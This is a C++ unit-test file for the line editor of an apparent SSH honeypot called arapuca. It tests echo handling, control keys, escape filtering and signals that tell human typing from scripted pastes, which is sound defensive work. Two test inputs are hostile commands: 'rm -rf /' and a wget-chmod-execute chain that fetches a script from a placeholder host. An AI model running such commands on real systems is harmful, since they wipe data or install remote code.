#include <arapuca/ssh/line_editor.hpp>

#include <gtest/gtest.h>

#include <string>

namespace {

using arapuca::ssh::LineEditor;
using arapuca::ssh::LineEvent;

std::string echo_of(LineEditor& editor, std::string_view bytes) {
    std::string out;
    for (const auto& step : editor.feed(bytes)) {
        out += step.echo;
    }
    return out;
}

TEST(LineEditor, EchoesPrintableBytes) {
    LineEditor editor;
    EXPECT_EQ("whoami", echo_of(editor, "whoami"));
    EXPECT_EQ("whoami", editor.buffer());
}

TEST(LineEditor, CarriageReturnCompletesALine) {
    LineEditor editor;
    editor.feed("whoami");
    const auto steps = editor.feed("\r");
    ASSERT_EQ(1U, steps.size());
    EXPECT_EQ(LineEvent::Line, steps[0].event);
    EXPECT_EQ("whoami", steps[0].line);
    EXPECT_EQ("\r\n", steps[0].echo);
    EXPECT_TRUE(editor.buffer().empty());
}

TEST(LineEditor, NewlineAlsoCompletes) {
    LineEditor editor;
    const auto steps = editor.feed("id\n");
    ASSERT_EQ(1U, steps.size());
    EXPECT_EQ("id", steps[0].line);
}

TEST(LineEditor, SeveralLinesInOneBlock) {
    LineEditor editor;
    const auto steps = editor.feed("whoami\rid\runame -a\r");
    ASSERT_EQ(3U, steps.size());
    EXPECT_EQ("whoami", steps[0].line);
    EXPECT_EQ("id", steps[1].line);
    EXPECT_EQ("uname -a", steps[2].line);
}

TEST(LineEditor, EmptyLineIsStillALine) {
    LineEditor editor;
    const auto steps = editor.feed("\r");
    ASSERT_EQ(1U, steps.size());
    EXPECT_EQ(LineEvent::Line, steps[0].event);
    EXPECT_TRUE(steps[0].line.empty());
}

TEST(LineEditor, BackspaceErasesAndEchoesTheErasure) {
    LineEditor editor;
    editor.feed("whoamix");
    const std::string echo = echo_of(editor, "\x7f");
    EXPECT_EQ("\b \b", echo);
    EXPECT_EQ("whoami", editor.buffer());
}

TEST(LineEditor, BackspaceOnAnEmptyBufferDoesNothing) {
    LineEditor editor;
    EXPECT_TRUE(echo_of(editor, "\x7f").empty());
    EXPECT_TRUE(editor.buffer().empty());
}

TEST(LineEditor, CtrlCInterruptsAndClears) {
    LineEditor editor;
    editor.feed("rm -rf /");
    const auto steps = editor.feed("\x03");
    ASSERT_EQ(1U, steps.size());
    EXPECT_EQ(LineEvent::Interrupt, steps[0].event);
    EXPECT_EQ("^C\r\n", steps[0].echo);
    EXPECT_TRUE(editor.buffer().empty());
}

TEST(LineEditor, CtrlDOnAnEmptyLineIsEndOfFile) {
    LineEditor editor;
    const auto steps = editor.feed("\x04");
    ASSERT_EQ(1U, steps.size());
    EXPECT_EQ(LineEvent::EndOfFile, steps[0].event);
}

TEST(LineEditor, CtrlDMidLineIsIgnored) {
    LineEditor editor;
    editor.feed("who");
    const auto steps = editor.feed("\x04");
    EXPECT_TRUE(steps.empty());
    EXPECT_EQ("who", editor.buffer());
}

// --- behavioural signals --------------------------------------------------

TEST(LineEditor, TabIsNoticedButNotActedOn) {
    LineEditor editor;
    EXPECT_FALSE(editor.used_tab());
    EXPECT_TRUE(echo_of(editor, "ca\t").find('\t') == std::string::npos);
    EXPECT_TRUE(editor.used_tab());
    EXPECT_EQ("ca", editor.buffer());
}

TEST(LineEditor, BackspaceMarksLineEditing) {
    LineEditor editor;
    EXPECT_FALSE(editor.used_line_editing());
    editor.feed("ab\x7f");
    EXPECT_TRUE(editor.used_line_editing());
}

TEST(LineEditor, ArrowKeysAreConsumedAndMarkEditing) {
    LineEditor editor;
    // ESC [ A is the up arrow. All three bytes must disappear.
    const std::string echo = echo_of(editor, "ls\x1b[A");
    EXPECT_EQ("ls", echo);
    EXPECT_EQ("ls", editor.buffer());
    EXPECT_TRUE(editor.used_line_editing());
}

TEST(LineEditor, ScriptedPasteLeavesNoHumanSignals) {
    LineEditor editor;
    editor.feed("cd /tmp; wget http://x/y.sh; chmod +x y.sh; ./y.sh\r");
    EXPECT_FALSE(editor.used_tab());
    EXPECT_FALSE(editor.used_line_editing());
}

// --- safety ---------------------------------------------------------------

// A terminal escape echoed back would let an attacker write to the operator's
// screen through the transcript.
TEST(LineEditor, ControlCharactersAreNeverEchoed) {
    for (int byte = 0; byte < 0x20; ++byte) {
        if (byte == '\r' || byte == '\n' || byte == 0x03) {
            continue;
        }
        LineEditor fresh;
        const std::string echo = echo_of(fresh, std::string(1, static_cast<char>(byte)));
        EXPECT_EQ(std::string::npos, echo.find(static_cast<char>(byte)))
            << "byte " << byte << " was echoed";
    }
}

TEST(LineEditor, LineLengthIsBounded) {
    LineEditor editor;
    editor.feed(std::string(LineEditor::kMaxLineLength * 3, 'a'));
    EXPECT_EQ(LineEditor::kMaxLineLength, editor.buffer().size());
}

TEST(LineEditor, OverlongLineStillCompletes) {
    LineEditor editor;
    editor.feed(std::string(LineEditor::kMaxLineLength * 2, 'a'));
    const auto steps = editor.feed("\r");
    ASSERT_EQ(1U, steps.size());
    EXPECT_EQ(LineEvent::Line, steps[0].event);
    EXPECT_EQ(LineEditor::kMaxLineLength, steps[0].line.size());
}

TEST(LineEditor, HighBytesArePreserved) {
    LineEditor editor;
    std::string input;
    input += '\xC3';
    input += '\xA7';
    editor.feed(input);
    EXPECT_EQ(2U, editor.buffer().size());
}

TEST(LineEditor, ResetClearsTheBufferButKeepsSignals) {
    LineEditor editor;
    editor.feed("ab\x7f");
    editor.reset();
    EXPECT_TRUE(editor.buffer().empty());
    EXPECT_TRUE(editor.used_line_editing()) << "signals describe the session, not the line";
}

TEST(LineEditor, HostileBlocksAreSurvivable) {
    for (const auto* block : {"\x1b\x1b\x1b\x1b",
                              "\x7f\x7f\x7f\x7f",
                              "\x03\x04\x03\x04",
                              "\x1b[",
                              "\x1b",
                              "\r\r\r\r"}) {
        LineEditor editor;
        EXPECT_NO_THROW({ (void)editor.feed(block); });
    }
}

}  // namespace
